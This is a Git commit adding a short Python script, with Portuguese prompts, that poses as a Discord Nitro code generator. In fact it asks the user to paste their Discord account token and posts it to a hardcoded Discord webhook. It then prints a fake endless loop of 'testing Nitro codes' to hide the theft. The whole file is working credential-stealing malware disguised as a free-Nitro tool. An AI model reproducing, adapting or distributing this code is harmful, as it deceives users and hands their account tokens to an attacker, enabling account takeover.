45dbbabbbf1909ba0e2d45ac0ade9ba45d3ddc1a
Shatei-a11 <80773384+Shatei-a11@users.noreply.github.com>
2021-04-10 13:28:34 -0300

    Create genera.py

---
+++ genera.py
@@ -0,0 +1,32 @@
+import requests
+import time
+print('''
+  \033[1;32m _____ __  _____  ______________  __
+  / ___// / / /   |/_  __/ ____/ / / /
+  \__ \/ /_/ / /| | / / / __/ / / / / 
+ ___/ / __  / ___ |/ / / /___/ /_/ /  
+/____/_/ /_/_/  |_/_/ /_____/\____/\033[m
+                                      ''')
+                                      
+print("  \033[36mCOLE O TOKEN CERTO SE N NAO IRA FUNCIONAR\033m")
+print("   A FERRAMENTA N RECONHECE SE ESTA CERTO O TOKEN")
+token = str(input("\n  COPIE SEU TOKEN E COLE NO TERMINAL \n"))
+
+
+def spam():
+	payload = {
+		'content': token
+	}
+	
+	header = {'authorization': token
+	}
+	
+	r =	requests.post("https://discord.com/api/webhooks/822481191844184075/J6D4_Z4SB-S-UkylG-pQo3g4RGqIT4apihQ9f_yMhQ9P1FiEzwUPgtXmtMg7jaj585Md", data=payload, headers=header)
+	return print("Começando")
+
+
+spam()
+while True:
+	print("TESTANDO CODIGO NITRO")
+	time.sleep(1)
+	print("INVALIDO, TENTANDO OUTRO")
